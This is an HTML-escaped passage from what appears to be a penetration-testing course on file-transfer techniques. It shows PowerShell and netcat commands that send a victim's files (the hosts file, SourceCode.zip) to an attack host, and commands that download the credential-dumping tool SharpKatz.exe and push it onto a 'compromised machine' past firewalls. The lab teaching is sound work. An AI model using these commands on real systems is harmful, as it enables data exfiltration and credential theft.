&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UploadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ftp://192.168.49.128/ftp-hosts&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;C:\Windows\System32\drivers\etc\hosts&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;powershell-base64-web-upload&quot;&gt;PowerShell Base64 Web Upload&lt;/h3&gt;

&lt;p&gt;Another way to use PowerShell and base64 encoded files for upload operations is by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-RestMethod&lt;/code&gt; together with Netcat. We use Netcat to listen in on a port we specify and send the file as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;C:\Windows\System32\drivers\etc\hosts&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Encoding&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://192.168.49.128:8000/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Method&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Body&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 8000

listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8000 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.128] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;smb-uploads&quot;&gt;SMB Uploads&lt;/h2&gt;

&lt;p&gt;We previously discussed that companies usually allow outbound traffic using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; (TCP/80) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; (TCP/443) protocols. Commonly enterprises don’t allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post &lt;a href=&quot;https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a&quot;&gt;Preventing SMB traffic from lateral connections and entering or leaving the network&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;An alternative is to run SMB over HTTP with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebDav&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebDAV&lt;/code&gt; &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4918&quot;&gt;(RFC 4918)&lt;/a&gt; is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebDAV&lt;/code&gt; protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebDAV&lt;/code&gt; can also use HTTPS.&lt;/p&gt;

&lt;h4 id=&quot;configuring-webdav-server&quot;&gt;Configuring WebDav Server&lt;/h4&gt;

&lt;p&gt;To set up our WebDav server, we need to install two Python modules, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsgidav&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cheroot&lt;/code&gt; (you can read more about this implementation here: &lt;a href=&quot;https://github.com/mar10/wsgidav&quot;&gt;wsgidav github&lt;/a&gt;). After installing them, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wsgidav&lt;/code&gt; application in the target directory.&lt;/p&gt;

&lt;h4 id=&quot;installing-webdav-python-modules&quot;&gt;Installing WebDav Python modules&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pip3 &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;wsgidav cheroot

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;171 kB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;using-the-webdav-python-module&quot;&gt;Using the WebDav Python module&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;wsgidav &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.0.0.0 &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80 &lt;span class=&quot;nt&quot;&gt;--root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp &lt;span class=&quot;nt&quot;&gt;--auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;anonymous 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;plaintext: 
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;None&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.is_disabled&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LockStorageDict&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - &lt;span class=&quot;s1&quot;&gt;&apos;/:dir_browser&apos;&lt;/span&gt;: FilesystemProvider &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;path &lt;span class=&quot;s1&quot;&gt;&apos;/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Read-Only&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;anonymous&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
10:02:53.950 - INFO    :   - &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt;: FilesystemProvider &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;path &lt;span class=&quot;s1&quot;&gt;&apos;/tmp&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Read-Write&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;anonymous&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;SSL.
10:02:53.950 - WARNING : Share &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt; will allow anonymous write access.
10:02:53.950 - WARNING : Share &lt;span class=&quot;s1&quot;&gt;&apos;/:dir_browser&apos;&lt;/span&gt; will allow anonymous &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;connecting-to-the-webdav-share&quot;&gt;Connecting to the Webdav Share&lt;/h4&gt;

&lt;p&gt;Now we can attempt to connect to the share using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DavWWWRoot&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    &amp;lt;DIR&amp;gt;          .
05/18/2022  10:05 AM    &amp;lt;DIR&amp;gt;          ..
05/18/2022  10:05 AM    &amp;lt;DIR&amp;gt;          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DavWWWRoot&lt;/code&gt; is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.&lt;/p&gt;

&lt;p&gt;You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder&lt;/p&gt;

&lt;h4 id=&quot;uploading-files-using-smb&quot;&gt;Uploading Files using SMB&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\htb&amp;gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb&amp;gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;miscellaneous-file-transfer-methods&quot;&gt;Miscellaneous File Transfer Methods&lt;/h1&gt;

&lt;p&gt;We’ve covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.&lt;/p&gt;

&lt;p&gt;This section will cover alternative methods such as transferring files using &lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;Netcat&lt;/a&gt;, &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;Ncat&lt;/a&gt; and using RDP and PowerShell sessions.&lt;/p&gt;

&lt;h2 id=&quot;netcat&quot;&gt;Netcat&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://sectools.org/tool/netcat/&quot;&gt;Netcat&lt;/a&gt; (often abbreviated to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.&lt;/p&gt;

&lt;p&gt;The original Netcat was &lt;a href=&quot;http://seclists.org/bugtraq/1995/Oct/0028.html&quot;&gt;released&lt;/a&gt; by Hobbit in 1995, but it hasn’t been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;Ncat&lt;/a&gt;, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.&lt;/p&gt;

&lt;p&gt;In this section, we will use both the original Netcat and Ncat.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;strong&gt;Ncat&lt;/strong&gt; is used in HackTheBox’s PwnBox as nc, ncat, and netcat.&lt;/p&gt;

&lt;h2 id=&quot;file-transfer-with-netcat-and-ncat&quot;&gt;File Transfer with Netcat and Ncat&lt;/h2&gt;

&lt;p&gt;The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let’s create an example and transfer a tool to our target.&lt;/p&gt;

&lt;p&gt;In this example, we’ll transfer &lt;a href=&quot;https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe&quot;&gt;SharpKatz.exe&lt;/a&gt; from our Pwnbox onto the compromised machine. We’ll do it using two methods. Let’s work through the first one.&lt;/p&gt;

&lt;p&gt;We’ll first start Netcat (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;) on the compromised machine, listening with option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-l&lt;/code&gt;, selecting the port to listen with the option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 8000&lt;/code&gt;, and redirect the &lt;a href=&quot;https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)&quot;&gt;stdout&lt;/a&gt; using a single greater-than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; followed by the filename, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpKatz.exe&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;netcat---compromised-machine---listening-on-port-8000&quot;&gt;NetCat - Compromised Machine - Listening on Port 8000&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Original Netcat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8000 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the compromised machine is using Ncat, we’ll need to specify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--recv-only&lt;/code&gt; to close the connection once the file transfer is finished.&lt;/p&gt;

&lt;h4 id=&quot;ncat---compromised-machine---listening-on-port-8000&quot;&gt;Ncat - Compromised Machine - Listening on Port 8000&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Ncat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;--recv-only&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From our attack host, we’ll connect to the compromised machine on port 8000 using Netcat and send the file &lt;a href=&quot;https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe&quot;&gt;SharpKatz.exe&lt;/a&gt; as input to Netcat. The option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-q 0&lt;/code&gt; will tell Netcat to close the connection once it finishes. That way, we’ll know when the file transfer was completed.&lt;/p&gt;

&lt;h4 id=&quot;netcat---attack-host---sending-file-to-compromised-machine&quot;&gt;Netcat - Attack Host - Sending File to Compromised machine&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Original Netcat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 0 192.168.49.128 8000 &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By utilizing Ncat on our attacking host, we can opt for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--send-only&lt;/code&gt; rather than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-q&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--send-only&lt;/code&gt; flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--send-only&lt;/code&gt;, there is no need to anticipate further incoming information.&lt;/p&gt;

&lt;h4 id=&quot;ncat---attack-host---sending-file-to-compromised-machine&quot;&gt;Ncat - Attack Host - Sending File to Compromised machine&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Ncat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ncat &lt;span class=&quot;nt&quot;&gt;--send-only&lt;/span&gt; 192.168.49.128 8000 &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there’s a firewall blocking inbound connections. Let’s listen on port 443 on our Pwnbox and send the file &lt;a href=&quot;https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe&quot;&gt;SharpKatz.exe&lt;/a&gt; as input to Netcat.&lt;/p&gt;

&lt;h4 id=&quot;attack-host---sending-file-as-input-to-netcat&quot;&gt;Attack Host - Sending File as Input to Netcat&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Original Netcat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 0 &amp;lt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;compromised-machine-connect-to-netcat-to-receive-the-file&quot;&gt;Compromised Machine Connect to Netcat to Receive the File&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Original Netcat&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;victim@target:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc 192.168.49.128 443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; SharpKatz.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s do the same with Ncat:&lt;/p&gt;

&lt;h4 id=&quot;attack-host---sending-file-as-input-to-ncat&quot;&gt;Attack Host - Sending File as Input to Ncat&lt;/h4&gt;

&lt;p&gt;Miscellaneous File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# Example using Ncat&lt;/span&gt;
